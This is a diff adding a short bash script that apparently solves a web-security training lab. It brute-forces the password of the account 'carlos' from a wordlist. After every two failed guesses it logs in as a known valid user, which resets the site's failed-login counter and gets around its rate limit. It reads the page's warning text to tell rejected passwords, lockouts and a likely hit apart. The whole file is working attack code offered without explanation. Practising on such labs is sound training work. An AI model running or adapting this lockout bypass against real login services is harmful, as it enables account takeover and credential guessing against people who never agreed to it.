@@ -1,0 +1,42 @@
+#!/usr/bin/env bash
+
+HOST="0a6e00ab04ec174681672ffe007a0085.web-security-academy.net"
+
+VICTIM="carlos"
+VALID_USER="wiener"
+VALID_PASS="peter"
+
+NORMAL="Incorrect password."
+LIMIT="You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+
+count=1
+
+while IFS= read -r password; do
+
+  if (( count % 3 == 0 )); then
+    curl -s -X POST "https://$HOST/login" \
+      --data-urlencode "username=$VALID_USER" \
+      --data-urlencode "password=$VALID_PASS" > /dev/null
+
+    count=1
+  fi
+
+  msg=$(
+    curl -s -X POST "https://$HOST/login" \
+      --data-urlencode "username=$VICTIM" \
+      --data-urlencode "password=$password" \
+      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
+  )
+
+  if [[ "$msg" == "$NORMAL" ]]; then
+    echo "$password | Incorrect password."
+  elif [[ "$msg" == "$LIMIT" ]]; then
+    echo "$password | Rate limited"
+  else
+    echo "$password | Possible valid password"
+    break
+  fi
+
+  count=$((count+1))
+
+done < pass_list.txt
